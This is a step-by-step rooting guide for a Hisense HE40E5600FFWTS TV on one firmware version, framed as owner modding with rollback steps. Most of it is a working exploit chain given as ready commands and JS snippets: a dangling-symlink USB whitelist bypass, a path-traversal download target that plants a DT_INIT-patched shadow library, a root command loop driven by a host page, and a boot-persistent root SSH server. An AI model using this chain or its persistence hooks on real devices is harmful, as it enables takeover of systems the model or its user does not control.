# ROOT-GUIDE — Hisense HE40E5600FFWTS (V0100.01.00A.N0410)

**Final, reproducible root path.** No flash, no `.pkg`, no UART, no opening the TV.
**Target TV:** Hisense HE40E5600FFWTS, FW `V0100.01.00A.N0410`, LAN `192.0.2.94`
**Host:** Linux with Python 3, `arm-linux-gnueabihf-*`, optional `qemu-arm`; host IP in the example `192.0.2.150`
**Status:** 2026-10-26 — root + Dropbear SSH (key-only) + PTY confirmed live; boot persistence installed (reboot test pending).

This folder is **self-contained**: payload, original lib, Dropbear binaries, host/TV scripts, public key, host-key fingerprint, build scripts and the docs are all here. You do not need to search through the old run folder. The old `docs/re/...` location is only evidence/provenance now.

---

## 0. Result

At boot, `hisense_browser` (UID 0, single-process, `CapEff=0000003fffffffff`) loads a prepared **`libtvsysinfo.so`** from `/3rd_rw/loglevel/lib`. The appended `DT_INIT` runs as root, writes the proof, starts the root loop and then calls the original init. Via the `HamService` wrapper, the root loop and Dropbear start on every boot. SSH is **key-only**; logging in as `root` gives a real root shell with PTY.

Evidence (live):

```
/3rd_rw/root_proof.txt = ROOT_EXEC_TVI
uid=0(root) gid=0(root)
Uid: 0 0 0 0   Gid: 0 0 0 0   CapEff: 0000003fffffffff
```

**Optional SFTP:** Dropbear does not ship its own `sftp-server`. The folder contains a **static OpenSSH 9.9p1 sftp-server** and a Dropbear with `SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server`; `root/scripts/host/install_sftp.sh` installs both (test on 2222, then swap to 22). Afterwards:
`sftp root@192.0.2.94`. See 9.4.

---

## 1. The chain (why this works)

1. **Browser is root.** `hisense_browser` runs as UID/GID 0, `CapEff` full, single-process, no seccomp/NoNewPrivs. JS in the browser is root-equivalent.
2. **USB write primitive.** `HSJSX_File::IsSubDentry` checks `realpath` + prefix against `/3rd_rw/appdata`, `/dev/shm/shm_tmp`, `/3rd/launcher/data`. A **dangling symlink** on an ext4 USB stick makes `realpath` fail on the missing target; the parent path `/dev/shm/shm_tmp/mnt/usb/<dev>` is allowed. `fopen` follows the symlink and creates the target file as root. This makes **new root files** creatable anywhere.
3. **Loader shadow.** `hisense_browser` has `libtvsysinfo.so` as a direct `NEEDED`; `DT_RPATH=/lib/`, where it is not located. `LD_LIBRARY_PATH` index 17 is `/3rd_rw/loglevel/lib` — the first directory that can supply the lib. The `libtvsysinfo.so` placed there via the symlink bypass is loaded on the next browser start.
4. **DT_INIT payload.** The real `libtvsysinfo.so` is extended with code at the end of the file (RX-LOAD `p_filesz/memsz` extended along with it); `DT_INIT` points to the new code. The code:
   - `unlink` of its own file (self-protection),
   - writes `/3rd_rw/root_proof.txt`,
   - `fork` + `execve("/bin/sh", ["/bin/sh", "/3rd_rw/appdata/root_loop.sh"], NULL)`,
   - calls the original `DT_INIT` via a PC-relative `bl`,
   - returns to the loader.
5. **Root loop.** `/3rd_rw/appdata/root_loop.sh` runs as root, reads `root_cmd.sh`, executes it and writes `root_out.txt`.
6. **SSH persistence.** `/3rd_rw/hamservice/HamService` is a wrapper: starts the root loop + Dropbear, then executes the real `/3rd/hamservice/HamService`. `startHam.sh` calls it at boot as root. Dropbear uses a bind-mounted `/etc/passwd` (root home `/3rd_rw/sshd/home`) and `~/.ssh/authorized_keys`. PTYs come from a devpts mount on `/dev/shm/pts`, which is bind-mounted onto `/dev/pts`.

---

## 2. Folder / artifacts

```
root/
  ROOT-GUIDE.md                 # this file
  README.md                     # short index
  tools/
    server.py                   # host: recon.html + /pub + /cmd + /recon + /dump
    recon.html                  # host: TV page with fileXHR/listDir/HiBrowser hook
    live_cmd.txt                # optional live command channel (empty = nothing)
    pub/
      libtvsysinfo.so           # final payload (33500 B)
      dropbear                  # static ARM Dropbear 2022.83 (key-only)
      dropbear-sftp             # Dropbear with SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server
      dropbearkey
      sftp-server               # static OpenSSH 9.9p1 sftp-server
      authorized_keys           # your public key
      start_sshd.sh             # TV: Dropbear + passwd/PTY bind mounts
      root_loop.sh              # TV: root command channel
      hamservice-wrapper.sh     # TV: boot hook, replaces /3rd_rw/hamservice/HamService
      deploy_sshd.sh            # TV: installs everything (run as root)
      verify.sh                 # TV: health check
      rollback.sh               # TV: tear everything down again
  scripts/
    host/
      prepare_usb.sh            # host: ext4/MBR stick + symlinks
      start_http.sh             # host: server on :9000
      plant_payload.js          # TV console: write payload via tvi
      upload_to_appdata.js      # TV console: Dropbear/deploy files to appdata
      run_root_cmd.js           # TV console: write root_cmd.sh/read root_out
      build_payload.sh          # host: build payload from tvi_original.so
      build_tvi_payload.py      # host: builder (deterministic)
      build_dropbear.sh         # host: build Dropbear from sources/
      build_sftp_server.sh      # host: build static sftp-server
      patch_dropbear_sftp.py    # host: patch Dropbear SFTP path
      install_sftp.sh           # host: install/test SFTP/swap to 22
    tv/
      start_sshd.sh
      root_loop.sh
      hamservice-wrapper.sh
      deploy_sshd.sh
      verify.sh
      rollback.sh
      install_sftp_stage.sh     # TV: sftp-server + test Dropbear on 2222
      enable_sftp.sh            # TV: schedule the swap to 22
      swap_sftp.sh              # TV: perform the swap (detached)
  artifacts/
    tvi_original.so             # original /3rd_rw/tvsysinfo/lib/libtvsysinfo.so (33220 B)
    keys/authorized_keys        # your public key
    keys/host-key-fingerprint.txt
sources/
  dropbear-2022.83.tar.bz2      # offline build source (SHA below)
  openssh-9.9p1.tar.gz          # offline build source for sftp-server
modding/                        # the modding docs (separate section)
dead-ends.md                    # short list of dead ends
SHA256SUMS
```

**Important:** `root/tools/pub/authorized_keys` contains **only** your public key. The private key stays on your machine and is nowhere in this folder.

---

## 3. Prerequisites

- TV in the LAN, reachable as `192.0.2.94` (adjust the IP if needed).
- Host in the same LAN; Python 3; for the rebuild: `gcc-arm-linux-gnueabihf`, `binutils-arm-linux-gnueabihf`, `make`, `bzip2`.
- Optional SFTP: OpenSSH client (`sftp`) on the host; the TV needs no client.
- USB stick, **ext4 with an MBR partition table** (no superfloppy). The TV mounts partitions.
- The public key in `root/tools/pub/authorized_keys` must match your private key. Currently:
  ```
  <your-public-key>
  ```
- Host key of the TV SSHD (Ed25519):
  ```
  <host-key-fingerprint>
  ```

---

## 4. The path in brief

```
1. USB stick:   sudo root/scripts/host/prepare_usb.sh /dev/sdX
2. Server:      root/scripts/host/start_http.sh
3. TV page:     http://<host-ip>:9000/recon.html
4. Payload:     root/scripts/host/plant_payload.js  (adjust USB dev) → reboot
5. Check root:  /3rd_rw/root_proof.txt = ROOT_EXEC_TVI
6. SSH files:   root/scripts/host/upload_to_appdata.js
7. Deploy:      root/scripts/host/run_root_cmd.js  → deploy_sshd.sh
8. Connect:     ssh root@192.0.2.94
9. Persistence: HamService wrapper is installed; reboot test
10. Rollback:   root/scripts/tv/rollback.sh (on the TV, as root)
11. SFTP opt.:  root/scripts/host/install_sftp.sh
```

The steps in detail:

---

## 5. Step 1 — USB stick (ext4 + MBR + `tvi` symlink)

### 5.1 Script

```bash
cd <repo-root>
sudo root/scripts/host/prepare_usb.sh /dev/sdX
```

The script is **destructive**: `wipefs`, MBR, `mkfs.ext4 -O ^64bit,^metadata_csum -L TVSYM`, then:

```
tvi -> /3rd_rw/loglevel/lib/libtvsysinfo.so   (mandatory, must remain dangling)
pwn -> /3rd_rw/root_proof.txt                 (optional, proof target)
```

### 5.2 Manual (in case you want to do it yourself)

```bash
lsblk -f
sudo wipefs -a /dev/sdX
sudo parted -s /dev/sdX mklabel msdos mkpart primary ext4 1MiB 100%
sudo mkfs.ext4 -O ^64bit,^metadata_csum -L TVSYM /dev/sdX1
sudo mkdir -p /mnt/data
sudo mount /dev/sdX1 /mnt/data
sudo ln -sfn /3rd_rw/loglevel/lib/libtvsysinfo.so /mnt/data/tvi
sudo ln -sfn /3rd_rw/root_proof.txt               /mnt/data/pwn
sync
sudo umount /mnt/data
```

- **`tvi` must be dangling** (the target does not exist yet). That is exactly the whitelist bypass.
- FAT32 cannot do symlinks; ext4 with an old feature set (`^64bit,^metadata_csum`) is mounted by the 3.18 kernel.
- A whole-disk ext4 (superfloppy, no `sdX1`) is **not** mounted.

Then insert the stick into the TV. The TV mounts it as `/dev/shm/shm_tmp/mnt/usb/<dev>` (visible to JS as `/mnt/usb/<dev>`, e.g. `sda1`/`sdb1`/`sdc1`).

---

## 6. Step 2 — Host server + recon page

```bash
cd <repo-root>
root/scripts/host/start_http.sh
# TV URL: http://<host-ip>:9000/recon.html
```

The server serves `recon.html`, `/cmd`, `/recon`, `/dump` and `/pub/*`. The TV page polls `/cmd` and executes JS in the **root browser**.

Open this on the TV in the browser:

```
http://<host-ip>:9000/recon.html
```

Determine the USB dev (console/hook):

```js
listDir("/mnt/usb")          // e.g. "[D] sda1"
listDir("/mnt/usb/sda1")     // must show "tvi"
```

---

## 7. Step 3 — Write the payload

### 7.1 Script (TV console)

Paste `root/scripts/host/plant_payload.js` into the console; **adjust `usb`**:

```js
var usb = "/mnt/usb/sda1";                 // <-- from listDir("/mnt/usb")
var target = "so/../../../../dev/shm/shm_tmp" + usb + "/tvi";
var url = location.origin + "/pub/libtvsysinfo.so";
var o = {};
o.download = HiBrowser.File.download(url, target, 1);
o.back = HiBrowser.File.download("file:///3rd_rw/loglevel/lib/libtvsysinfo.so",
                                 "tvi_check_plant.so", 1);
o
```

Expected: `download=0`, `back=0`; afterwards this exists:

```
/3rd_rw/loglevel/lib/libtvsysinfo.so   33500 B
SHA-256 37b13f91959acea9b3c3fd4d0e62bb2d4cb41f773add060bef68ac67657f5b0a
```

### 7.2 Manual (without JS file)

```js
HiBrowser.File.download(
  "http://<host-ip>:9000/pub/libtvsysinfo.so",
  "so/../../../../dev/shm/shm_tmp/mnt/usb/sda1/tvi",
  1
);
```

### 7.3 Verify

- `back=0` and the 33.500 B / SHA above.
- Optionally compare the read-back file `tvi_check_plant.so` with `pub/libtvsysinfo.so`.
- **Do not reboot** before the bytes are correct.

### 7.4 Reboot

Power the TV fully off and on again. At boot `hisense_browser` loads the shadow lib from index 17; the `DT_INIT` runs as root.

---

## 8. Step 4 — Check root / command channel

After the boot, open the recon page again.

```js
fileXHR("file:///3rd_rw/root_proof.txt")         // ROOT_EXEC_TVI
fileXHR("file:///3rd_rw/appdata/root_loop.pid")  // e.g. 1425
listDir("/3rd_rw/loglevel/lib")                  // only liblogLevel.so => self-unlink ok
```

Root command via the loop:

```js
HiBrowser.File.write("root_cmd.sh",
  "id\n" +
  "cat /proc/self/status | grep -E '^(Uid|Gid|CapEff):'\n", 1);

// after about 2 s:
fileXHR("file:///3rd_rw/appdata/root_out.txt")
```

Expected:

```
uid=0(root) gid=0(root)
Uid: 0 0 0 0
Gid: 0 0 0 0
CapEff: 0000003fffffffff
```

Ready-made snippet: `root/scripts/host/run_root_cmd.js` (adjust CMD).

---

## 9. Step 5 — Install Dropbear/SSH

### 9.1 Load files to `/3rd_rw/appdata`

Paste `root/scripts/host/upload_to_appdata.js` into the TV console. It loads from `root/tools/pub/`:

```
dropbear dropbearkey authorized_keys start_sshd.sh root_loop.sh
hamservice-wrapper.sh deploy_sshd.sh verify.sh rollback.sh
```

to `/3rd_rw/appdata`. Expected: all values `0`.

### 9.2 Deploy as root (via the root loop)

Run `root/scripts/host/run_root_cmd.js` with

```
/bin/sh /3rd_rw/appdata/deploy_sshd.sh
```

(or in the console):

```js
HiBrowser.File.write("root_cmd.sh", "/bin/sh /3rd_rw/appdata/deploy_sshd.sh\n", 1);
// after about 5 s:
fileXHR("file:///3rd_rw/appdata/root_out.txt")
```

`deploy_sshd.sh` does:

- `dropbear`/`dropbearkey` → `/3rd_rw/sshd/`
- host key (`dropbearkey -t ed25519 -f /3rd_rw/sshd/host_key`)
- `/etc/passwd` copy with `root:/3rd_rw/sshd/home:/bin/sh`, **bind mount** over `/etc/passwd`
- devpts on `/dev/shm/pts`, **bind mount** over `/dev/pts` (PTY; `/dev` is static ro)
- `authorized_keys` from the public key
- `start_sshd.sh` + `root_loop.sh` + `hamservice-wrapper.sh`
- start of Dropbear on `0.0.0.0:22`, key-only
- health output (processes, port, log, host key, mounts)

### 9.3 Connect

```bash
ssh root@192.0.2.94
# or, if your key is not the default:
ssh -i ~/.ssh/<your-private-key> root@192.0.2.94
```

On the first connection, confirm the host key:

```
ED25519 key fingerprint is <host-key-fingerprint>
```

Expected: `root@...:~#`, `id` → `uid=0(root)`.

**Key-only:** `DROPBEAR_SVR_PASSWORD_AUTH=0` at build time; there is no password login. Your public key is the only access.

**PTY:** the devpts workaround is in `start_sshd.sh`/`deploy_sshd.sh`. If `PTY allocation failed` still occurs:

```sh
mkdir -p /dev/shm/pts
mount -t devpts -o mode=620,ptmxmode=666,gid=5 devpts /dev/shm/pts
mount --bind /dev/shm/pts /dev/pts
```

Then connect again; Dropbear does not need a restart. Fallback without PTY:

```bash
ssh -T root@192.0.2.94 'id; uname -a'
```

### 9.4 SFTP (optional, key-only)

Dropbear has **no sftp-server of its own**; the server execs the compile-time
`SFTPSERVER_PATH` (default `/usr/libexec/sftp-server`). The ro rootfs allows no
file there. That is why the folder contains:

- `tools/pub/sftp-server` — static OpenSSH 9.9p1 sftp-server (ARM)
- `tools/pub/dropbear-sftp` — Dropbear with
  `SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server`

Installation from the host (uses your SSH key; an `sftp` client is only needed for the test):

```bash
cd <repo-root>
root/scripts/host/install_sftp.sh
# optional: TV=root@192.0.2.94 SSH_KEY=~/.ssh/id_ed25519 ...
```

Procedure: loads both binaries to `/3rd_rw/appdata`; starts a
**test Dropbear on port 2222** (port 22 stays untouched); tests
`sftp -P 2222`; only on success is the binary swapped to 22
(backup: `/3rd_rw/sshd/dropbear.nosftp`). Afterwards:

```bash
sftp root@192.0.2.94
# pwd, ls, put, get ...
```

**Rollback:**

```bash
ssh root@192.0.2.94 \
  'cp -f /3rd_rw/sshd/dropbear.nosftp /3rd_rw/sshd/dropbear; \
   kill $(cat /3rd_rw/sshd/dropbear.pid) 2>/dev/null; \
   /bin/sh /3rd_rw/sshd/start_sshd.sh'
```

**SFTP is root-equivalent** (login as root), key-only, LAN only. It is
the same access as SSH; no additional credentials.

---

## 10. Step 6 — Persistence (boot)

`deploy_sshd.sh` already installs `/3rd_rw/hamservice/HamService`:

```sh
#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/basic/bin
export PATH
/bin/sh /3rd_rw/appdata/root_loop.sh >/dev/null 2>&1 &
[ -x /3rd_rw/sshd/start_sshd.sh ] && /bin/sh /3rd_rw/sshd/start_sshd.sh >/dev/null 2>&1 &
exec /3rd/hamservice/HamService "$@"
```

Boot sequence:

1. `startHam.sh` changes to `/3rd_rw/hamservice`.
2. `[ -e HamService ] && [ -x HamService ]` → `./HamService &`.
3. The wrapper starts the root loop + Dropbear (bind mounts/PTY), then `exec`s the real `/3rd/hamservice/HamService`.
4. Root loop and Dropbear keep running as root.

**Reboot test:** restart the TV; then:

```bash
ssh root@192.0.2.94 'id; ps | grep -E "dropbear|root_loop"'
```

Or on the TV: `/bin/sh /3rd_rw/appdata/verify.sh`.

**Alternative for early mods:** `/3rd_rw/developer.sh` (executed as root by `/basic/autorun.sh` line 90, **before** `ms_service`/`hisenseUI`/`app_man`/`delayrun`). See `modding/02-boot.md` and `modding/04-modding.md`.

---

## 11. Step 7 — Rollback

### 11.1 Script (TV, as root)

```sh
/bin/sh /3rd_rw/appdata/rollback.sh
# or upload from this folder and run it
```

It stops the loop/Dropbear, restores the HamService symlink, unmounts `/etc/passwd`/`/dev/pts`/`/dev/shm/pts`, removes `/3rd_rw/sshd`, the shadow lib and the old ms/appdata payloads. Then reboot.

### 11.2 Manual

```sh
kill "$(cat /3rd_rw/appdata/root_loop.pid)" 2>/dev/null
kill "$(cat /3rd_rw/sshd/dropbear.pid)" 2>/dev/null
rm -f /3rd_rw/hamservice/HamService
ln -s /3rd/hamservice/HamService /3rd_rw/hamservice/HamService
umount /etc/passwd 2>/dev/null
umount /dev/pts 2>/dev/null
umount /dev/shm/pts 2>/dev/null
rm -rf /3rd_rw/sshd
rm -f /3rd_rw/loglevel/lib/libtvsysinfo.so
sync
reboot
```

The ro rootfs is unchanged; the original `libtvsysinfo.so` remains under `/3rd_rw/tvsysinfo/lib`. No flash, no `.pkg`.

---

## 12. Troubleshooting

| Problem | Cause / solution |
|---|---|
| `PTY allocation request failed` / `openpty: No space left on device` | `/dev/pts` is not devpts. `mkdir -p /dev/shm/pts; mount -t devpts -o mode=620,ptmxmode=666,gid=5 devpts /dev/shm/pts; mount --bind /dev/shm/pts /dev/pts`. Connect again. |
| `Permission denied (publickey)` | `grep '^root:' /etc/passwd` must show `/3rd_rw/sshd/home:/bin/sh` (bind mount). `authorized_keys` 600, `.ssh` 700, home 700. `cat /3rd_rw/sshd/dropbear.log`. |
| `Connection refused` | Dropbear is not running: `ps | grep dropbear`, `cat /3rd_rw/sshd/dropbear.log`, `/bin/sh /3rd_rw/sshd/start_sshd.sh`. Port 22: `/proc/net/tcp` (`:0016`). |
| Host key warning | `ssh-keygen -R 192.0.2.94`; confirm the fingerprint `SHA256:7tFL…`. |
| Recon page gone | Reopen the TV browser: `http://<host-ip>:9000/recon.html`. SSH/root loop run independently. |
| No SSH after reboot | Check `/3rd_rw/hamservice/HamService` (wrapper, 755), `/3rd_rw/sshd/start_sshd.sh`, `dropbear.log`, `mount.log`. `startHam.sh` starts the wrapper. |
| Root user not found | The `/etc/passwd` bind is missing: `mount --bind /3rd_rw/sshd/etc_passwd /etc/passwd`; `grep '^root:' /etc/passwd`. |
| No root after payload | Check the file 33.500 B/SHA; `/3rd_rw/loglevel/lib/libtvsysinfo.so` present; restart the browser; index 17. |
| `dropbear: Invalid option -s` | This build has no `-s`; password auth is **compile-time** off. Remove `-s` from the start script (already not included here). |
| `sh: /usr/libexec/sftp-server: No such file` | The Dropbear is still the unpatched one. Run `root/scripts/host/install_sftp.sh`; check: `grep -a 'sftp-server' /3rd_rw/sshd/dropbear` → `/3rd_rw/sshd/sftp-server`. |
| SFTP on 2222 fails | Check `/3rd_rw/sshd/dropbear2222.log`; port 22 was not touched. |
| SFTP on 22 fails | `/3rd_rw/sshd/swap.log`, `/3rd_rw/sshd/dropbear.log`; rollback command in 9.4. |

Dead ends and discarded paths: `../dead-ends.md` (brief).

---

## 13. Artifacts and hashes

| Artifact | Path | Size / SHA-256 |
|---|---|---|
| Original `libtvsysinfo.so` | `artifacts/tvi_original.so` | 33.220 B / `36ddee4782cdcff7a0f1d94e8b3491ea6fe228d13bfef3ea137a98f142ff3b7c` |
| Root payload | `tools/pub/libtvsysinfo.so` | 33.500 B / `37b13f91959acea9b3c3fd4d0e62bb2d4cb41f773add060bef68ac67657f5b0a` |
| Dropbear | `tools/pub/dropbear` | 882.204 B / `976ec57e401765d5fc9c0a201d19c997c004dcf91a8d4bdb039bbb8419071eae` |
| Dropbearkey | `tools/pub/dropbearkey` | 755.452 B / `3fbfa60891b3a9f3e971a24071ed4d14c93ee3e773dd6f4969646cc811b0dbbf` |
| Dropbear source | `sources/dropbear-2022.83.tar.bz2` | `bc5a121ffbc94b5171ad5ebe01be42746d50aa797c9549a4639894a16749443b` |
| SFTP server | `tools/pub/sftp-server` | 635.680 B / `d0f7700e84e582aef3948c29e4317fb0119e13393374a7455922ffa8d01202f3` |
| Dropbear (SFTP) | `tools/pub/dropbear-sftp` | 882.204 B / `a21b0d3e53dd1d124105350319df45a2b44e7cef70dd29b418644b11fdcfed57` |
| OpenSSH source | `sources/openssh-9.9p1.tar.gz` | `b343fbcdbff87f15b1986e6e15d6d4fc9a7d36066be6b7fb507087ba8f966c02` |
| Host key (SSH) | TV: `/3rd_rw/sshd/host_key` | Ed25519 / `<host-key-fingerprint>` |
| Your auth key | `tools/pub/authorized_keys` | fingerprint `<host-key-fingerprint>` |
| Root proof | TV: `/3rd_rw/root_proof.txt` | `ROOT_EXEC_TVI\n` |
| Root loop | TV: `/3rd_rw/appdata/root_loop.sh` | PID: `/3rd_rw/appdata/root_loop.pid` |

`SHA256SUMS` at top level: `cd <repo-root> && sha256sum -c SHA256SUMS`.

---

## 14. Security / limits

- **SSH is key-only, root, in the LAN.** No password login; the private key is the only access. Do not expose it to the internet.
- **SFTP is optional and root-equivalent.** Key-only like SSH; the sftp-server runs as root. Installation first tests port 2222; backup `/3rd_rw/sshd/dropbear.nosftp`; rollback in 9.4.
- **The root loop is root-equivalent.** Anyone who can write `/3rd_rw/appdata/root_cmd.sh` (the browser runs as root) can execute root commands. Intended, but treat it accordingly.
- **No flash, no `.pkg`, no bootloader.** rootfs and `/3rd` are squashfs-ro; changes live in `/3rd_rw` (rw), `/data` (rw), `/perm` (rw) and in bind mounts.
- **The `/etc/passwd` bind** only changes the runtime view (root home/shell); the ro original file remains unchanged. A reboot without the start script restores the original state.
- **Persistence** comes from the `HamService` wrapper (and possibly `developer.sh`). The `libtvsysinfo` shadow deletes itself.
- **Firmware updates** can change paths/behavior; afterwards check loader order, the HamService hook and `/3rd_rw`.
- **No secrets in the folder:** no root hash, no private SSH key. Only public key + host fingerprint.

---

## 15. Verification status

| Item | Status |
|---|---|
| Browser root (UID 0, CapEff full) | **CONFIRMED live** |
| USB ext4 symlink bypass | **CONFIRMED live** (`/3rd_rw/root_proof.txt`) |
| `libtvsysinfo` shadow / DT_INIT | **CONFIRMED live** (`ROOT_EXEC_TVI`, self-unlink) |
| Root loop / command channel | **CONFIRMED live** (`uid=0`, `root_out.txt`) |
| Dropbear SSH, port 22 | **CONFIRMED live** (`00000000:0016`) |
| SSH pubkey auth as root | **CONFIRMED live** (`Pubkey auth succeeded for 'root'`) |
| PTY / interactive shell | **CONFIRMED live** (session pts/0; `busybox script` → `uid=0(root)`) |
| SFTP (optional) | static sftp-server + patched Dropbear; installer tests 2222 before 22; **TV test after install** |
| Boot persistence (HamService wrapper) | set up; reboot test described in this doc |
| Payload build reproducible | **CONFIRMED** (`build_tvi_payload.py` → exactly `37b13f…`) |

**Scripts:** `tools/pub/*` is the shipped state; `scripts/tv/*` the source. `deploy_sshd.sh` matches the manually executed live setup. `prepare_usb.sh`/`start_http.sh`/`plant_payload.js`/`upload_to_appdata.js`/`run_root_cmd.js` are the host/TV helpers. `build_dropbear.sh` rebuilds the binaries in `tools/pub` reproducibly from `sources/`; `build_sftp_server.sh` builds the static sftp-server; `install_sftp.sh` installs/tests SFTP.

Good luck. And: back up first, then mod. :)
